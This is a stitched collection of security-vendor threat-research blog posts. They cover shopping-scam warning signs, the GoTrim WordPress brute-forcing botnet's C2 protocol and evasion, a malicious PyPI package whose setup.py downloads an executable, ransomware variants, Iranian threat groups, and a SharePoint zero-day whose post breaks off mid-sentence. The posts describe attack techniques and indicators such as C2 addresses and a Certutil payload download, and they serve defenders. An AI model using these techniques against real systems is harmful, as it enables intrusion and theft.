plug in a payment gateway, and design or incorporate shopping carts into a website. Even the need to work with a bank to process credit cards has been replaced with third-party services that handle billing, simplifying the process for both the entrepreneur and scammer alike. Things to watch out for when shopping online: When shopping online, there are a number of things you need to check, especially if the site you are shopping at is not a well-known brand. Domain age. If the domain is less than a few months old, the likelihood that it is a scam website is very high. Many search engines penalize new sites and will not rank them, which means you likely arrived there through some sort of phishing scam. Older sites tend to be owned by more reputable companies, meaning they are less likely to be scams (unless the domain has expired). They are also ranked higher due to the fact that it takes investment to keep a site up and running, so they show up first when running an online search for an item. Promoted on social media or paid advertisements.This is another giveaway. Just because an advertisement is on a major social media platform or search engine does not mean it is legitimate. Often, advertisements on a page are curated by a third party. Using this strategy, combined with hashtags and other keywords curated for their target audience, helps create a sense of credibility that allows bad actors to connect with their victims. It Is also a lot easier to market to victims this way if thire site is new. Outlandish claims.“This is not a scam!” “You will not regret it!” Phrases like these are psychological ploys designed to create FOMO, or fear of missing out, in their victims. Do your own due diligence when purchasing items from lesser-known sellers. Grammatical issues.This is a major red flag.  Legitimate sites, especially those intending to stay in business, employ copy editors to ensure proper grammar, punctuation, and spelling. Although not necessarily always true (mistakes do happen), egregious grammatical errors in web copy often indicate it was written by someone who is not a native speaker, which is a warning sign that warrants further investigation. Unusually low prices.Unusually low pricing is often another warning sign. How likely is it that a retailer like Amazon would be willing to let go of thousands of dollars’ worth of high-end products for less than ten percent of their value? High-value items may end up in unsorted returns, but it is rare. And unlike the claims in Figure 6, these returns are usually not collated by brand. Instead, their inclusion is often random and items are returned in various conditions. All websites mentioned in this blog are blocked by theFortiGuard Web Filtering client.

    "title": "GoTrim: Go-based Botnet Actively Brute Forces WordPress Websites",
    "link": "https://www.fortinet.com/blog/threat-research/gotrim-go-based-botnet-actively-brute-forces-wordpress-websites",
    "content": "FortiGuard Labs Threat Research FortiGuard Labsrecently encountered a previously unreported Content Management System (CMS) scanner and brute forcer written in the Go programming language (also commonly referred to as Golang). We took a closer look at this malware because it was being described in several online forums as being installed in compromised WordPress sites, but there were no publicly available analysis reports. Golang brute forcers are not new. For example, we previously reported on theStealthWorkercampaign in 2019. This new brute forcer is part of a new campaign we have named GoTrim because it was written in Go and uses “:::trim:::”to split data communicated to and from the C2 server. Similar to StealthWorker, GoTrim also utilizes abot networkto perform distributed brute force attacks. The earliest sample we found was from Sep 2022. That campaign is still ongoing at the time of writing. This article details how this active botnet scans and compromises websites using WordPress and OpenCart. We also highlight some differences between samples collected from Sep to Nov 2022 at the end of the article. GoTrim uses a bot network to perform distributed brute force attacks against its targets. Each bot is given a set of credentials to use to attempt to log into a long list of website targets. After a successful login, a bot client is installed into the newly compromised system. It then awaits further commands from the threat actors, thereby expanding the bot network. GoTrim only reports credentials to the C2 server after a successful brute force attempt. We did not observe any code in GoTrim for propagating itself or deploying other malware. However, we did find PHP scripts that download and execute GoTrim bot clients. It seems likely that the threat actor is somehow abusing compromised credentials to deploy PHP scripts to infect systems with GoTrim. Typically, each script downloads the GoTrim malware from a hardcoded URL to a file in the same directory as the script itself and executes it. To cover its tracks, both the downloader script and GoTrim brute forcer are deleted from the infected system. It does not maintain persistence in the infected system. Analysis detailed in this article is based on a sample with SHA-256 hash c33e50c3be111c1401037cb42a0596a123347d5700cee8c42b2bd30cdf6b3be3, unless stated otherwise. GoTrim is built with Go version 1.18. As with all Go applications, all third-party libraries used in the code are statically linked to the malware, resulting in a relatively bigger file size for the executable binary. But this has the advantage of not depending on any external files to execute correctly. To solve the size issue, the malware is packed using UPX to reduce the file from 6 MB to 1.9 MB. Another advantage of using Go is that the same source code can be cross-compiled to support different architectures and Operating Systems. Based on the source code paths in the samples, Windows was used during the development of GoTrim. However, we have only observed samples targeting 64-bit Linux in the wild. GoTrim can communicate with its Command and Control (C2) server in two ways: a client mode, where it sends HTTP POST requests to the Command and Control (C2 server), or a server mode, where it starts an HTTP server to listen for incoming POST requests. All data exchanged with the C2 is encrypted using the Advanced Encryption Standard in Galois Counter Mode (AES-GCM) with a key derived from a passphrase embedded in the malware binary. By default, GoTrim attempts to run in server mode if the infected malware is directly connected to the Internet—that is, if the victim's outbound orlocal IP addressis non-private. Otherwise, it switches to client mode. Upon execution, GoTrim creates an MD5 hash representing a unique identification for the infected machine (bot ID). This is generated from the following string containing several pieces of information delimited by the “:” character: VICTIM_EXTERNAL_IP:HTTP_SERVER_PORT:1:OUTBOUND_IP:AES_PASSPHRASE After generating the bot ID, GoTrim creates an asynchronous Go routine (similar to multithreading) that sends a beacon request to the C2 server on both client and server modes. The C2 request URLs change between versions, as discussed in a later section of this article. For this particular sample, the beacon request URL is “/selects?dram=1”. In this beacon request, several pieces of victim and bot information are sent to the C2 server, as seen in Figure 3. Some of the interesting fields sent in the beacon request include the following: 1.Bot ID: unique ID for the bot2.External IP: public IP address of the victim machine3.HTTP Server Port: randomly generated port for the HTTP server (0 in client mode)4.Malware Initialization Flag: always set to 1 by the time this request is made5.Outbound IP: local IP address of the victim machine6.Status Message: The “GOOD” message is replaced by other strings that report the status of any running CMS detection or brute forcing tasks during subsequent beacon requests.7.Status Flags: These indicate whether the malware currently has any processing tasks assigned by the C2 server and the IDs of these tasks8.MD5 Checksum: This value is generated from parts of the above request and the hardcoded AES passphrase. It serves as a message integrity checksum. The fields are joined together with the:::trim:::string, hence the name chosen for this campaign. The data is then encrypted using an AES-256-GCM key, the SHA-256 hash of the previously mentioned passphrase. The server usually responds with “OK”, “404 page not found”, or “BC”, all encrypted with the same AES-GCM key. When “BC” is received, GoTrim will regenerate its bot ID and switch from server to client mode. The first beacon request is to register a new bot (victim) to the bot network. After each beacon request, GoTrim sleeps between a few seconds to several minutes, depending on the C2 server response and whether the malware is currently working on C2-assigned tasks before sending the next request. The malware regularly performs this beacon request to update the C2 server about the bot's status, including successful credentials, as discussed in the brute forcing section of the article. If GoTrim fails to receive a valid response from the C2 server after 100 retries, it will terminate itself. While the beacon requests are being sent asynchronously to update the C2 server on its status, GoTrim either sends a request to the C2 server to receive commands (client mode) or sets up an HTTP server to listen for incoming tasking requests (server mode). In client mode, the malware sends a POST request to “/selects?bilert=1” to receive commands from the C2 server. The C2 server responds with the command encrypted with the same AES-GCM key. An example of a decrypted command can be seen below in Figure 4. After splitting the data by the “:::trim:::” string, seven fields can be identified, as listed below. 1.MD5 Checksum: used for checking message integrity, e.g., 83217f8b39dccc2f9f2a0157f0236c4f2.Command ID: This indicates the command for the current task3.Concurrency Level: This affects how many goroutines are executed for each task4.Command Options: This contains options for the commands, separated by 7E 6A 71 6D 70 C2 A9 (~jqmp©) bytes. They are interpreted differently depending on the command: a.Target List: This is GZIP-compressed data, which, when decompressed, contains a list of domains that will be the target for the login attempts.b.Command Option 1(redacted): This option contains the username for authentication commands. Instead of using the same username for each domain, the C2 server can specify a series of bytes, like C2 A9 64, to use the domain as the username.c.Command Option 2(redacted): For authentication commands, this option contains the passwordd.Command Option 3: Unknown option for WordPress authenticatione.Command Option 4: Option for WordPress authentication to use either POST request or XML-RPC when submitting credentials. 5.Internal Values: Numeric values that are not used by the malware itself (e.g.,42and255) and likely represent internal tasking IDs for the current command. The malware supports the following commands: We have observed a target list containing up to 30,000 domains in a single WordPress authentication command. Additionally, we observed that authentication commands only provide a single password to test against all the domains in the list. As mentioned above, brute forcing is likely distributed by commanding a network of infected machines to test different domains and credentials. After the malware has completed processing a command, it sleeps for a while before sending another POST request to receive a new task from the C2 server. In server mode, GoTrim starts a server on a random port between 4000 to 7999 to respond to incoming POST requests sent by the threat actor. This mode gives the threat actor a more responsive way of communicating with the bot. For instance, the status of the bots can be checked by the threat actor without waiting for the subsequent beacon request by simply sending a POST request to a specific URL handled by the bot’s HTTP server. To issue a command to the machine, the threat actor sends a POST request to “/BOT_ID?lert=1” with the body containing the AES-256-GCM encrypted command data, similar to the response provided by the C2 server when the client requests commands (Figure 4). Server mode supports the same commands as client mode. The threat actor can also send a request with the parameter \"/BOT_ID?intval=1” to view the status of currently running tasks and whether assigned tasks have been completed. When CPU utilization is below a certain level (75% or 90%, depending on the number of concurrent workers used for the current task), a separate goroutine is spawned to process each domain. GoTrim attempts to identify whether one of the four CMSes (WordPress, Joomla!, OpenCart, or DataLife Engine) is being used on the target website. It does this by checking for specific strings in the webpage content. Interestingly, it only targets self-hosted WordPress websites by checking the Referer HTTP header for “wordpress.com”. As managed WordPress hosting providers, such as wordpress.com, usually implement more security measures to monitor, detect, and block brute forcing attempts than self-hosted WordPress websites, the chance of success is not worth the risk of getting discovered. The strings used for determining the installed CMS are listed below. WordPress Joomla! OpenCart DataLife Engine While GoTrim can detect websites using the four CMSes above, it currently only supports authenticating against WordPress and OpenCart websites. This indicates that this botnet is still under development. Aside from the username provided by the C2 server, it attempts to gather more usernames by sending a GET request to “/wp-json/wp/v2/users”. After that, it tries to log in to the WordPress website using the list of usernames and the password provided in the C2 command by sending a POST request to “/wp-login.php”. Figure 5 shows an example of the POST request for logging in. This request causes a redirect to the admin page of the WordPress website (i.e.,/wp-admin) after a successful login. To confirm that the login and redirection were successful, it checks to see if the response contains “id=\\\"adminmenumain\\”. The C2 server can also specify the authentication to be performed via the WordPress XML-RPC feature, which is another way for users to programmatically interact with the CMS remotely using XML. By communicating directly with the web server’s backend, anti-bot mechanisms such as captchas that usually work when accessing the website pages could be bypassed. After a successful login, the following information (delimited by “|”) is updated into a global status message and sent with the following request to the C2 (client mode) or in the response to incoming requests (server mode): GoTrim can also brute force websites running the open-source e-commerce platform OpenCart. It sends a GET request to the target’s “/admin/index.php” and collects the authentication-related tokens and headers needed for the login request. It then performs the actual authentication by sending a POST request to the same URL with form-encoded data containing the username and the password. To verify that the login request was successful, it checks if the website returned an OpenCart user token by searching for “/dashboard&user_token=” and making sure the “redirect” value from the received data is not empty. A valid authentication response should look like the following: {\"redirect\":\"https://example.com/opencart/admin/index.php?route=common/dashboard&user_token=USER_TOKEN_HASH\"} Upon successful login, the global status message is updated for WordPress brute-forcing. GoTrim can detect anti-bot techniques used by web hosting providers and CDNs, such as Cloudflare and SiteGround, and evade some of their simpler checks. It tries to mimic legitimate requests from Mozilla Firefox on 64bit Windows by using the same HTTP headers sent by the browser and supporting the same content encoding algorithms: gzip, deflate, and Brotli. For WordPress websites, it also detects whether CAPTCHA plugins are installed. The malware contains code to solve the CAPTCHA for some of these plugins. However, we need to verify if the bypass techniques work. We determined that it cannot bypass Google, WP Limit Login Attempts, and Shield Security’s CAPTCHAs. In general, for the security plugins it cannot bypass, it only reports them to the C2 server by updating the global status message with information similar to the data it sends during a successful login. But it uses “3GOOD” for the brute force status to indicate that credential validation was skipped. On encountering websites that contain the string “1gb.ru” within the page content, GoTrim also sends the same “3GOOD” brute force status. This appears to be a conscious decision to avoid targeting websites hosted by this provider, but the intent remains unclear. While searching for other samples related to this campaign, we found a PHP script and binary from September 2022 with different URLs “/selects?param=1” and “/selects?walert=1” on C2 server 89[.]208[.]107[.]12 (Figure 6). The PHP script we detect as PHP/GoTrim!tr.dldr uses the same installation method, with only the download URL varying across the samples we gathered. A version of the binary that appeared in November 2022 also updated its HTTP POST URLs (Figure 7). The beacon request URL “/selects?dram=1” and the command request URL “/selects?bilert=1” have been changed to “/route?index=1” and “/route?alert=1”, respectively. The encryption algorithm and keys used in the data transmission remain the same. Although this malware is still a work in progress, the fact that it has a fully functional WordPress brute forcer combined with its anti-bot evasion techniques makes it a threat to watch for—especially with the immense popularity of the WordPress CMS, which powers millions of websites globally. Brute-forcing campaigns are dangerous as they may lead to server compromise and malware deployment. To mitigate this risk, website administrators should ensure that user accounts (especially administrator accounts) use strong passwords. Keeping the CMS software and associated plugins up to date also reduces the risk of malware infection by exploiting unpatched vulnerabilities. FortiGuard Labs will continue to monitor GoTrim’s development. The FortiGuard Antivirus service detects and blocks this threat asELF/GoTrim!trandPHP/GoTrim!tr.dldr.

    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-new-malicious-python-package-shaderz",
    "content": "FortiGuard Labs Threat Research Our Fortinet Advanced Research Team recently discovered a 0-day attack in a PyPI package (Python Package Index) called “shaderz”. It was discovered on December 6, 2022, through a system we use to monitor open-source ecosystems. This Python package was published on December 2, 2022, as shown in its official PyPI repository. Our suspicions were initially raised because it only has one published version, 0.0.1, and does not include a clear description of the package, the author’s email, or its source page. The package includes malicious code in its setup.py installation script that downloads and runs an executable file as a part of its installation. One particularly interesting element is the URL, which requires deeper analysis: https://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045159487079723058/stub.exe. As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256):33df1d9c50a9bd9d3e71dc61c0a7f41f7ca51612e9c3babcea927adde169e62d. While this download URL has not previously been detected by any other threat researchers, some vendors do flag the downloaded executable file as malicious. The downloaded executable seems to be a python script compiled into an executable file. We will share more details of our analysis of this file in our next post. We will continue to monitor and help organizations defend against malicious packages found in the wild like this one to help protect our customers against attacks from unknown sources. For more detail,read part 2of this blog. FortiGuard AntiVirus detects the malicious executable identified in this report as W32/PossibleThreat The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

    "title": "Ransomware Roundup – New Vohuk, ScareCrow, and AERST Variants",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-new-vohuk-scarecrow-and-aerst-variants",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolvingransomwarelandscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers Vohuk, ScareCrow, and AERST ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Like most ransomware, the new Vohuk variant encrypts files on compromised machines and tries to extort money from victims. Its dropped ransom note, “README.txt”, asks victims to contact the attacker via email with a unique ID assigned to each victim. As seen in the ransom note, this Vohuk ransomware variant is version 1.3, potentially indicating that the attacker has updated the ransomware several times. Files encrypted by Vohuk ransomware have a “.Vohuk” file extension. It also replaces file icons with a red lock icon. The ransomware also replaces the desktop wallpaper with its own. The ransomware leaves a distinctive mutex, “Global\\\\VohukMutex”, which prevents different instances of Vohuk ransomware from running on the same system. Based on the file submission locations to VirusTotal, Vohuk ransomware has primarily affected Germany and India. ScareCrow is another typical ransomware that encrypts files on victims’ machines. Its ransom note, also titled “readme.txt”, contains three Telegram channels that victims can use to speak with the attacker. While no financial demand is requested in the ransom note, victims will most likely be asked to pay ransom to recover their encrypted files. At the time of this writing, those three Telegram channels were unavailable. ScareCrow ransomware appears to have some similarities with the infamous Conti ransomware: both use the CHACHA algorithm to encrypt files and delete shadow copies using wmic based on shadow copy IDs. This is not all that surprising because the Conti ransomware source code was reportedly leaked earlier in the year. However, the ScareCrow threat actor put some effort into developing this ransomware variant, as our analysis found some significant differences. For example, Conti encrypts all command strings with one decryption routine, whereas ScareCrow encrypts every string, including the name of the DLLs it loads (i.e., kernel32), the name of the APIs it uses, and even the command strings with its own decryption routine. ScareCrow ransomware adds a “.CROW” file extension to affected files. ScareCrow ransomware files were submitted to VirusTotal from Germany, India, Italy, the Philippines, Russia, and the United States. This indicates that this ransomware is relatively widespread, albeit by using unknown infection vectors. AESRT is a new ransomware strain that FortiGuard Labs recently came across. It encrypts files on compromised machines and appends an “.AESRT” file extension to the files it encrypts. Instead of leaving a ransom note, the ransomware displays a popup window that includes the attacker’s email address. It also accepts a field to enter the purchased key required to decrypt the ransomed files. The ransomware also deletes shadow copies, which inhibits the victim’s ability to recover files. Fortinet customers are already protected from these malware variants through FortiGuard’s AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known Vohuk, ScareCrow, and AESRT ransomware variants with the following AV signatures: Vohuk ransomware ScareCrow ransomware AESRT ransomware Vohuk ransomware ScareCrow ransomware AESRT ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering integration and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "content": "The conflict in the Middle East continues to make headlines, as it has done since the October 7, 2023 Hamas attacks against Israel, which led to Israel retaliating with an ongoing onslaught on the Gaza Strip. The situation heated up further in recent weeks, with Israel and Iran both bombing each other’s territories, leading to U.S. intervention when it bombed Iran’s nuclear facilities, attempting to disrupt or destroy Iran’s nuclear program. Shortly after, U.S. President Donald Trump announced a ceasefire between the two countries, which, at time of writing, appears to be tentatively holding. While most of the attention has focused on the physical actions occurring in this war, such as bombing, aid blockades and destruction, another potential front in the war is cyber space, an increasingly common arena in modern conflicts. Both Israel and Iran, two of the main players in the current hostilities, have a history of carrying out destructive cyber attacks, including against each other. We published a whitepaper last year discussing the cyber activity we typically see emanating from this region titledConflict in the Middle East: An Overview of Cyber Threat Actors and Risks. One of the most infamous cyber incidents to take place in this region was the deployment of the Stuxnet worm, which was designed to break laboratory equipment used by Iranian scientists to enrich uranium at the Natanz facility in Iran. This facility was one of the targets bombed by the U.S. in its recent strikes against Iran. Stuxnet was among the first known major nation-state cyberattacks that demonstrated hackers’ ability to manipulate and even destroy physical equipment. Stuxnet was designed to cause the spinning motors at the bottom of Natanz's enrichment centrifuges to shatter. It was firstpublished about by researchers at Symantec in 2010, after the worm spread outside of the Natanz facility and was found on private networks. Stuxnet has long been suspected to be the work of the U.S. and Israel, though it has never been claimed by either country. Given that Stuxnet was only discovered after penetrating private networks, it is quite possible that cyber operations are currently being leveraged by and against these governments without our knowledge. Recent media reports indicate potential cyber warfare impacting the region, including an attack by pro-Israel hackers dubbed Predatory Sparrow on Iranian crypto exchange Nobitex in whichthe attackers drained $90 million of cryptocurrencyfrom the exchange. There were alsoreportsthat Iranian group Damselfly was carrying out a targeted phishing campaign focused on high-profile Israeli individuals, particularly prominent academics, journalists, and security researchers (See more in Damselfly profile). Damselfly is just one of the key cyber actors who are most likely to be active in the current conflict, potentially targeting the networks of significant institutions in other nations for espionage, disruptive or destructive purposes. We have reasonably good insight into some of the main Iranian actors and their activity. Iranian threat actors have become increasingly proficient in recent years. Not only has their malware improved, but they’ve also developed a strong social engineering capability that they’ve leveraged against targets of interest, even mounting digital honeytrap operations. One of the hallmarks of Iran’s operations in cyberspace is that it periodically mounts destructive attacks against organizations in countries it deems hostile, which at the moment would obviously include the U.S., and its long-standing foe Israel. That creates a risk for organizations in those countries because these attacks are about sending a message rather than stealing information, which means that any organization in the country targeted could be in the firing line. There are a couple of Iranian threat actors worth noting that are among the most active at the moment, the first of which is Seedworm (aka MuddyWater, Temp Zagros, Static Kitten). Seedworm is a long-standing Iranian group, which usually mounts classic espionage attacks for the purposes of spying and information gathering. Active since 2017, CISA said that Seedworm is “a subordinate element within the Iranian Ministry of Intelligence and Security.” Seedworm originally focused on victims in the Middle East but later broadened its scope to target telecommunications, defense, local government, and oil and natural gas organizations in Asia, Africa, Europe, and North America. The group develops its own custom malware as well as using dual-use and living off the land tools. While originally focused on espionage, in recent timesSeedworm has begun either collaborating with another threat group, or else has a sub-group within it, carrying out destructive attacks that masquerade as ransomware. These attacks involve ransomware known as DarkBit and, while it does encrypt computers like regular ransomware, the attackers seem more interested in making a statement than collecting a ransom. Some of the ransom notes they’ve left have had an unusually political tone, implying the ransomware was deployed more as retaliation rather than a money generating exercise. A recent campaign tentatively linked to Seedworm focused on smaller organizations, including organizations in utility, transport, and the manufacturing sector outside the Middle East. The attackers took advantage of compromised home routers that were infected with the Mirai malware. It isn’t clear if this access was purchased or if the infections were initiated by Seedworm itself, but it had access to numerous compromised home routers from which it attacked the victim organizations by proxying through them. These attacks did not come from Iranian IP addresses, they came from small routers in a whole range of countries. Seedworm used this network of hacked routers to scan for vulnerable IIS servers, and used a variety of known vulnerabilities to then gain access to these servers. Once on these servers, it used an off-the-shelf tool, known as Plink, that allowed it to create a reverse RDP tunnel. Plink is a legitimate off-the-shelf tool. RDP inbound connections were blocked by the firewall but Plink is able to create an outbound SSH connection back to the attacker, which is allowed, and that connection is then used to tunnel classic RDP traffic, bypassing the firewall. Seedworm then sideloaded BruteRatel, a commercial red-teaming and adversarial attack simulation tool, and used a scheduled task for persistence. The attackers used Brute Ratel to obtain credentials and once they had them they began to latterly traverse to other machines and ultimately obtained more credentials using reg.exe, by dumping the SAM. Seedworm then gained access to file servers and SQL servers seeking data of interest. It launched SQL injection attacks across the internal network to gain access to the SQL servers. The attackers then installedndisproxyon the web servers to create an attacker-in-the-middle (AITM) attack to exploit and infect actual victims of interest, such as government organizations that visit and use these private organizations’ services. In most cases, they weren’t interested in the infected victim, they were actually interested in using the access as a jumping off point to gain access to another organization. Some of the target organizations held key personal data of victims of interest – for example government officials. The attackers also appeared to be interested in digital certs, which they stole to sign their own tools to use against other organizations. Transportation companies were also among the group’s targets. Iranian attack groups have historically been interested in the transport sector in order to track the movements of both goods and individuals to gain an insight into military equipment and high-value shipments etc, and, in some cases, for the purposes of foreign and domestic intelligence gathering operations. All of the infected organizations in this campaign were SMBs, in a variety of sectors and all based outside the Middle East. None of them were “typical” victims for Iranian threat groups, pointing to a widening scope in victims targeted by Seedworm. Druidfly (aka Homeland Justice, Karma), which specializes in disk-wiping attacks, is another Iranian attack group to be aware of. It first came to public attention after a July 2022 wiper attack on multiple targets belonging to the government of Albania. The wiper left messages directed against the Mujahideen E-Khalq (MEK), an Iranian dissident organization based in Albania. Shortly afterward, a group calling itself Homeland Justice claimed credit for the attack. In response to the attack, Albania broke off diplomatic relations with Iran. This triggered another wave of attacks in September 2022, apparently in retaliation for Albania publicly attributing the attacks to Iran. While Homeland Justice purported to be a hacktivist outfit, the FBI later established that “Iranian state cyber actors” were responsible for the attacks. Druidfly reappeared in 2023, when it began targeting Israel with a wiper called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is “Bibi”(See Case Study). Druidfly is currently active amidst the ongoing conflict and tensions in the region. The Threat Hunter Teamtweeted on June 20, 2025, that we had seen a Druidfly wiper targeting organizations in Albania. The wiper was signed with a legitimate certificate, which was probably stolen. On the Monday following (June 23),it was reported in the media that public services in Albania’s capital Tirana had been disrupted by a cyber attackthat took down the city’s official website and affected local government operations. Homeland Justice claimed credit for the attack and said it had taken down the city’s official website, exfiltrated data and wiped servers, citing the presence of MEK in the country as the reason for the attack. Following the escalation of the conflict in Gaza in 2023, Druidfly was linked to a series of wiper attacks against multiple targets in Israel. In this case, the attacks were carried out under a persona called Karma that purports to be a hacktivist group sympathetic to the Palestinian cause. The wiper deployed in these attacks was called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is Bibi. The wiper encrypted files on the hard disk before overwriting the master boot record (MBR) and crashing the computer. Efforts to restart the computer would fail because of the destruction of the MBR. Analysis of the wiper revealed clear anti-Israel messages within the wiper’s code. Furthermore, analysis of BibiWiper by the Threat Hunter Team found clear similarities between it and wipers deployed by Druidfly during attacks against Albania in 2022 and 2023. Tracing other tools used to initiate the BibiWiper attacks against Israel revealed the following overlap in tactics, techniques, and procedures between these attacks and earlier Druidfly attacks: Damselfly (aka Charming Kitten, Mint Sandstorm) is an Iranian espionage group that has been active since 2014. It was initially known for targeting Israel with attacks before it broadened its focus to include the U.S. and other countries. While the group is principally known to be involved in intelligence gathering, members of the group are also known to have participated in extortion attacks. It has been linked by multiple vendors with Iran’s Islamic Revolutionary Guard Corps (IRGC). In March 2022, Damselfly wasone of several Iranian groups reported to have moved into mounting large-scale social engineering campaigns. Consistent features of these campaigns included the use of charismatic sock puppets, lures of prospective job opportunities, solicitation by journalists, and masquerading as think tank experts seeking opinions. The attackers leveraged networks such as LinkedIn, Facebook, Twitter, and Google. Damselfly has also been linked to an attack targeting a nuclear security expert at a U.S.-based think tank in July 2023; attacks on Israel’s transportation, logistics, and technology sectors in November 2023; as well as a January 2024 campaign targeting individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the UK, and the U.S. The attackers in that campaign used bespoke phishing lures themed around the Israel-Hamas conflict to trick targets into downloading malware. Most recently,Check Point reportedthat a new Damselfly campaign that began in mid-June 2025 targeted Israeli journalists, cyber security experts and computer science professors from leading Israeli universities with spear phishing campaigns in an attempt to steal credentials and multi-factor authentication codes in order to gain access to targets’ email accounts. Some of the victims were approached by attackers who posed as fictitious assistants to technology executives or researchers through emails and WhatsApp messages. Active since at least 2014, Mantis (aka Desert Falcon, Arid Viper, APT-C-23), is an Arabic speaking group that appears to be based in the Gaza Strip. The group is known to mount espionage attacks against targets in the government, military, media, financial, research, education, and energy sectors. Most of its attacks have been against organizations in the Middle East but it has, on occasion, attacked targets outside the region. It has also been known on occasion to target individuals or organizations internally within Gaza. Whileother vendors have linked the group to Hamas, the Threat Hunter Team cannot make a definitive attribution to any Palestinian organization. The group mainly favors spear-phishing emails with malicious attachments or links to malicious files as its main infection vector. Mantis uses custom malware and its most recent toolset includes the backdoors Trojan.Micropsia and Trojan.AridGopher. Micropsia is capable of taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration. However, its main purpose appears to be running secondary payloads for the attackers. Arid Gopher is a modular backdoor that is written in Go. It appears to be regularly updated and rewritten by the attackers, most likely to evade detection. These tools were used in a Mantis attack in late 2022/early 2023 that targeted organizations within the Palestinian territories. The initial infection vector for this campaign remains unknown, but both the Micropsia and AridGopher malware were deployed in this attack. In one intrusion, the attackers deployed three distinct versions of the same toolset (that is, different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network. If the Mantis operators are based within Gaza it is unlikely the group is operational at the moment given the blockade of the territory by Israel and limited internet access in the region. However, it’s not unusual for members of groups to be based outside the countries or regions they are operating on behalf of, which could be the case for Mantis operators, though we have no evidence of this. As the conflict in the Middle East continues, the types of cyberattacks we are likely to see emanating from Iran, potentially directed at Israel but also against its backers such as the U.S., are probably going to be either espionage or disruption attacks. Seedworm, Damselfly and Druidfly are some of the most likely actors we could see venturing into this conflict, with the groups having the skills and experience to carry out potentially serious and destructive attacks. Iranian actors’ skills at social engineering are something that organizations in Israel, the U.S., and other nations or organizations of interest should be aware of. Iranian threat actors also have a history of carrying out attacks at times when they know organizations' guard may be down - such as at the weekend or during public holidays when activity would be more likely to pass unnoticed for a longer period of time. This was most clearly demonstrated during theShamoon wiping attacksthat targeted organizations in Saudi Arabia in 2012, 2016 and 2018, which mostly began on holidays or weekends. As we head into vacation season for many in the U.S., cyber teams should have their guard up as threat actors may think this quieter time could be a prime opportunity to get a grip on networks and potentially cause major disruption.

Update 2025-07-21, 10:40 UTC: Blog has been updated with additional indicators of compromise (IOCs). Microsoft has partiallypatched a zero-day vulnerability in SharePointfollowing reports of its exploitation in the wild. The vulnerability (CVE-2025-53770), dubbed ToolShell, affects on-premises SharePoint servers and gives an attacker unauthenticated access to vulnerable servers, allowing them to remotely execute code and access all content and file systems. While the 2019 version of SharePoint Server and SharePoint Server Subscription Edition have been patched, the 2016 version remains unpatched. In its guidance on the vulnerability, Microsoft said it was “aware of active attacks targeting on-premises SharePoint Server customers”. It provided no further information on which actors were behind these attacks. The new zero-day vulnerability is a variant of a recently patched vulnerability,CVE-2025-49704, which was patched in July 2025. Symantec products already block exploitation of this vulnerability with the following network protection: Web Attack: Microsoft SharePoint CVE-2025-49704. A second, related vulnerability (CVE-2025-53771) has also been patched. A path traversal bug, it allows an authorized attacker to perform spoofing over a network. It too is a variant of a recently patched vulnerability (CVE-2025-49706) and the patch includes more robust protections against exploitation of the older flaw. One some networks where post-exploitation activity took place, the attackers first ran an encoded PowerShell command. The attackers then used Certutil to download a file named client.exe (SHA256: fd03d881f0b3069f5adec6ae69181899e72fd27b3e75bb9075d0798ed3184274) from 134.199.202[.]205 and save it as a file named debug.js. PowerShell was used to run commands as below with the –value parameter used to pass commands: The executable was likely renamed as debug.js in order to make it look benign and avoid raising suspicions. It then ran the following batch file located at c:\\\\temp\\\\test.bat: The executable was also used to run the following files: Backup.exe is a renamed variant of WinRAR. It was used to steal cryptographic secrets: In 